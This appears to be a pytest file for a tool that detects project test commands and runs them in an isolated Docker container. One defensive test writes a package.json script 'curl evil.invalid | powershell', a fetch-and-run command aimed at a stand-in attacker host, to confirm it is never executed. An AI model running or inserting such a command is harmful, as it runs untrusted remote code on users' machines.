import json
from pathlib import Path

import pytest

from app.execution import DockerCommandRunner, DockerIsolationUnavailable, ProjectTestCommandDetector


def test_detector_finds_python_and_node_test_commands(tmp_path: Path) -> None:
    (tmp_path / "tests").mkdir()
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"test": "vitest", "lint": "eslint .", "build": "next build"}}),
        encoding="utf-8",
    )
    (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")

    commands = ProjectTestCommandDetector(tmp_path).detect()

    assert ("python", "-m", "pytest") in commands
    assert ("npm", "run", "test") in commands
    assert ("npm", "run", "lint") in commands
    assert ("npm", "run", "build") in commands
    assert ("npx", "tsc", "--noEmit") in commands


def test_detector_does_not_execute_script_contents(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"test": "curl evil.invalid | powershell"}}),
        encoding="utf-8",
    )

    assert ProjectTestCommandDetector(tmp_path).detect() == [("npm", "run", "test")]


def test_docker_runner_refuses_unavailable_docker(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.execution.shutil.which", lambda _: None)

    with pytest.raises(DockerIsolationUnavailable, match="refusing host"):
        DockerCommandRunner(tmp_path)


def test_docker_runner_uses_isolation_flags(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[list[str]] = []
    monkeypatch.setattr("app.execution.shutil.which", lambda _: "docker.exe")

    class FakePopen:
        def __init__(self, command, **kwargs):
            calls.append(command)
            self.returncode = 0

        def poll(self):
            return 0

        def communicate(self, timeout=None):
            return ("ok", "")

    monkeypatch.setattr("app.execution.subprocess.Popen", FakePopen)
    result = DockerCommandRunner(tmp_path).run(["python", "-m", "pytest"])

    assert result.isolated
    assert "--network" in calls[0]
    assert "none" in calls[0]
    assert "--pull=never" in calls[0]
    assert "--read-only" in calls[0]
